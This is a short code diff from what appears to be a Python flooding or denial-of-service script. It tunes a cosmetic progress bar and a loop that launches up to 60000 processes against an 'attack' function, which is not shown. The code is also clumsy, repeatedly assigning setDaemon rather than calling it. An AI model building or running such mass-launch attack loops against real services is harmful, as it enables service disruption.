@@ -79,20 +79,20 @@ sleep(1)
 from progress.bar import Bar, ChargingBar
 import os, time, random
 
-bar2 = ChargingBar('Instalando:', max=100)
+bar2 = ChargingBar('Procesando:', max=100)
 for num in range(100):
-    time.sleep(random.uniform(0, 0.5))
+    time.sleep(random.uniform(0, 0.3))
     bar2.next()
 bar2.finish()
 
 def send3attack():
   for i in range(60000): 
     mp = multiprocessing.Process(target=attack)
-    mp.setDaemon = True
-    mp.setDaemon = True
-    mp.setDaemon = True
+    mp.setDaemon = False
+    mp.setDaemon = False
+    mp.setDaemon = False
     mp.start() 
-    sleep(0.1)
+    sleep(0.6)
 	
 send3attack()
 exit(1)
